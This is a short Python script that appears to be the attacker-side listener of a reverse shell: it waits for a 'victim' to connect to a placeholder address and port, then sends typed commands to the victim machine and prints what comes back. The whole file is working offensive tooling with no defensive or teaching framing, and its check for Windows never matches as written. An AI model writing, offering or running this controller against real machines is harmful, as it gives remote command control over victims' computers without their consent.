from socket import *
import os
from colorama import Fore
import platform


oss = platform.uname()

if oss == "Windows":
    os.system('cls')
else:
    os.system('clear')


server = socket(AF_INET,SOCK_STREAM)

server.bind(("myip",myport))

print(Fore.RED+"[+]"+Fore.WHITE+" Waiting for the victim to connect")
server.listen(1)

client,addr = server.accept()

addr_info = tuple(addr)

print(Fore.LIGHTBLUE_EX+"\n[!]"+Fore.YELLOW+" Client Connected (: ")

print(Fore.RED+f"\nIP : {addr_info[0]} "+Fore.BLUE+"|"+Fore.RED+f" PORT : {addr_info[1]} \n")


# print(Fore.WHITE+client.recv(12345).decode())

while True:

    shell = input(Fore.GREEN+client.recv(1234).decode())

    if  shell == '' or shell == "\n":
        client.send("nothing".encode())
        continue


    client.send(shell.encode())
    data = client.recv(1234).decode()
    print(data)

